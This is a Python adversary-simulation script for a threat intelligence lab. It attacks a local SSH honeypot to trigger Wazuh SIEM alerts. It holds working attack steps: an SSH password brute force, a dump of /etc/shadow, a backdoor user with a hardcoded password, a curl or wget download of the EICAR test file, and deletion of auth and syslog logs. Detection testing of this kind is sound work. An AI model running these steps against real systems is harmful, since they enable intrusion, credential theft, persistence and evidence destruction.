#!/usr/bin/env python3
"""
Advanced Adversary Simulation (Red Team) - Threat Intelligence Lab.

Drives a real attack over the network against the linux-honeypot on
127.0.0.1:2222. Unlike a scripted `docker exec`, every action here is genuine
SSH traffic, so the honeypot's Wazuh agent detects it and forwards alerts to
the manager - which in turn fires the Active Response and VirusTotal SOAR.

Mapped to:
- Cyber Kill Chain (Lockheed Martin)
- MITRE ATT&CK
- The Diamond Model of Intrusion Analysis

Requires paramiko (see requirements.txt). Target/creds overridable via env:
  HONEYPOT_HOST (default 127.0.0.1)  HONEYPOT_PORT (default 2222)
  HONEYPOT_USER (default root)       HONEYPOT_PASS (default toor)
"""

import os
import socket
import time
import sys

try:
    import paramiko
except ImportError:
    print("[!] paramiko not installed. Run: pip install -r requirements.txt")
    sys.exit(1)

HOST = os.environ.get("HONEYPOT_HOST", "127.0.0.1")
PORT = int(os.environ.get("HONEYPOT_PORT", "2222"))
USER = os.environ.get("HONEYPOT_USER", "root")
PASSWORD = os.environ.get("HONEYPOT_PASS", "toor")

# Wrong passwords used to generate real failed-auth events for Wazuh.
WORDLIST = [
    "123456", "password", "admin", "root", "letmein", "qwerty",
    "toor123", "changeme", "password1", "12345678", "welcome", "to0r",
]


def print_phase(phase, name, mitre, diamond, desc):
    bar = "=" * 70
    print(f"\n[{bar}]")
    print(f"| PHASE {phase}: {name}")
    print(f"| MITRE ATT&CK : {mitre}")
    print(f"| DIAMOND MODEL: {diamond}")
    print(f"| DESCRIPTION  : {desc}")
    print(f"[{bar}]")


def try_login(password, retries=3):
    """One SSH auth attempt. Returns a connected client on success, else None.

    Retries transient transport errors ("Error reading SSH protocol banner",
    connection reset) that happen when a busy/emulated sshd briefly drops a
    connection under load - the auth itself never got a verdict, so retrying is
    correct. A real AuthenticationException (wrong password) is NOT retried.
    """
    for attempt in range(1, retries + 1):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                HOST, port=PORT, username=USER, password=password,
                allow_agent=False, look_for_keys=False,
                timeout=10, banner_timeout=15, auth_timeout=15,
            )
            return client
        except paramiko.AuthenticationException:
            client.close()
            return None  # definitive wrong-password
        except (paramiko.SSHException, EOFError, OSError) as exc:
            client.close()
            if attempt < retries:
                time.sleep(1.5 * attempt)  # back off, sshd may be throttling
                continue
            print(f"    [!] connection error after {retries} tries: {exc}")
            return None


def ssh_exec(client, command):
    """Run a command on the honeypot over the live SSH session."""
    stdin, stdout, stderr = client.exec_command(command, timeout=15)
    out = stdout.read().decode(errors="ignore")
    err = stderr.read().decode(errors="ignore")
    return (out + err).strip()


def main():
    print("\n>> INITIATING ADVERSARY SIMULATION <<")
    print(f"Target honeypot: {USER}@{HOST}:{PORT}\n")
    time.sleep(1)

    # -- PHASE 1: Reconnaissance ------------------------------------------
    print_phase(1, "Reconnaissance", "T1595 (Active Scanning)",
                "Infrastructure", "Probing target for the open SSH service.")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    if s.connect_ex((HOST, PORT)) == 0:
        print(f"[*] SUCCESS: Port {PORT} is OPEN on target.")
    else:
        print(f"[!] Port {PORT} closed - is the honeypot up? Aborting.")
        s.close()
        sys.exit(1)
    s.close()
    time.sleep(1)

    # -- PHASE 2: Delivery & Initial Access (real brute force) ------------
    print_phase(2, "Delivery & Initial Access", "T1110 (Brute Force)",
                "Adversary -> Victim",
                "SSH password brute-force against the weak root login.")

    # Attacker cracks the weak credential quickly and HOLDS that session, then
    # keeps hammering to trip the SIEM's brute-force rule + Active Response.
    # Because the honeypot accepts ESTABLISHED,RELATED traffic and the AR ban is
    # appended (not inserted), the held foothold survives while NEW connections
    # from the attacker get dropped - so this single run exercises detection,
    # the ban, AND the post-exploitation + malware paths.
    print("[*] Probing weak credentials...")
    for i, pw in enumerate(WORDLIST[:4], 1):
        print(f"[*] Attempt {i}: {USER}:{pw}")
        c = try_login(pw, retries=1)
        if c:
            c.close()
        time.sleep(0.3)

    print(f"[*] Trying known weak credential {USER}:{PASSWORD}...")
    session = try_login(PASSWORD)
    if not session:
        print("[!] Could not establish a session. Stopping post-exploitation.")
        return
    print(f"[+] CREDENTIALS CRACKED -> {USER}:{PASSWORD}. Foothold HELD.")

    # Keep hammering (throwaway connections) to push past the brute-force
    # threshold so Wazuh rule 5763 fires and Active Response bans the source.
    print("[*] Continuing the brute-force to trip SIEM detection + Active Response...")
    for i in range(12):
        c = try_login(f"rockyou_{i}", retries=1)
        if c:
            c.close()
        time.sleep(0.3)
    print("[+] Brute-force burst done. Wazuh should now ban the source IP "
          "(new connections blocked; this foothold persists).")
    time.sleep(2)

    # -- PHASE 3: Execution & Discovery -----------------------------------
    print_phase(3, "Execution & Discovery",
                "T1082 (System Info), T1003 (Credential Dumping)",
                "Capability", "Post-breach recon over the SSH session.")
    for cmd in ("whoami", "uname -a", "cat /etc/passwd", "cat /etc/shadow"):
        out = ssh_exec(session, cmd)
        preview = out.splitlines()[:3]
        print(f"[*] $ {cmd}")
        for line in preview:
            print(f"      {line}")
    time.sleep(1)

    # -- PHASE 4: Persistence ---------------------------------------------
    print_phase(4, "Installation & Persistence", "T1136 (Create Account)",
                "Capability -> Victim", "Creating a backdoor account.")
    print("[*] Creating hidden system user 'sysadmin_bckp'...")
    ssh_exec(session, "useradd -m -s /bin/bash sysadmin_bckp 2>/dev/null; "
                      "echo 'sysadmin_bckp:Backd00r!' | chpasswd")
    print("[+] Backdoor account created.")
    time.sleep(1)

    # -- PHASE 5: Command & Control (malware drop) ------------------------
    print_phase(5, "Command & Control", "T1105 (Ingress Tool Transfer)",
                "Infrastructure -> Capability",
                "Downloading the EICAR test payload via cURL.")
    print("[*] Fetching EICAR payload to /tmp/eicar.com.txt ...")
    ssh_exec(session,
             "curl -s -o /tmp/eicar.com.txt https://secure.eicar.org/eicar.com.txt "
             "|| wget -q -O /tmp/eicar.com.txt https://secure.eicar.org/eicar.com.txt")
    listing = ssh_exec(session, "ls -l /tmp/eicar.com.txt")
    print(f"[+] Payload dropped -> {listing}")
    print("    (FIM should raise a syscheck alert -> VirusTotal integration.)")
    time.sleep(1)

    # -- PHASE 6: Actions on Objectives (Defense Evasion) -----------------
    print_phase(6, "Actions on Objectives (Defense Evasion)",
                "T1070 (Indicator Removal)", "Adversary",
                "Wiping auth logs to cover tracks.")
    print("[*] Clearing /var/log/auth.log ...")
    # Wazuh already forwarded the events in real time, so the trail survives.
    ssh_exec(session, "echo '' > /var/log/auth.log 2>/dev/null; "
                      "rm -f /var/log/syslog 2>/dev/null")
    print("[+] Local logs wiped (but the SIEM already has the evidence).")

    session.close()
    print("\n=========================================================")
    print("ADVERSARY SIMULATION COMPLETE")
    print("Open the Wazuh dashboard to review the detected Kill Chain,")
    print("the Active Response ban, and the VirusTotal malware verdict.")
    print("=========================================================\n")


if __name__ == "__main__":
    main()
